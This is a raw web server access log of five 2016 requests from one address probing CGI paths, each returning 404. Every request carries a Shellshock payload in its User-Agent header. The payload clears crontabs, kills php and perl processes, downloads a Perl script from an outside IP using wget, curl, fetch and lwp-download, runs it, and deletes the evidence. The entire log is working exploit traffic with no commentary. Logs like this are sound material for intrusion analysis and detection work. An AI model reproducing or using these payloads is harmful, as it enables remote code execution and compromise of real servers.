31.184.195.114 - - [29/Apr/2016:06:31:24 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:24 +0000] "GET /cgi-bin/up.cgi HTTP/1.1" 404 468 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:24 +0000] "GET /cgi-bin/wrapper HTTP/1.1" 404 469 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:25 +0000] "GET /cgi.cgi HTTP/1.1" 404 461 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
31.184.195.114 - - [29/Apr/2016:06:31:25 +0000] "GET /fcgi-php/php HTTP/1.1" 404 466 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"crontab -r;killall -9 php perl; cd /tmp/ ; mkdir bat-mobile ; cd /tmp/bat-mobile ; wget http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman ; lwp-download http://31.184.194.100/batman-vs-superman ; fetch http://31.184.194.100/batman-vs-superman ; curl -O http://31.184.194.100/batman-vs-superman ; perl batman-vs-superman;cd /tmp/;rm -rf bat*\");'"
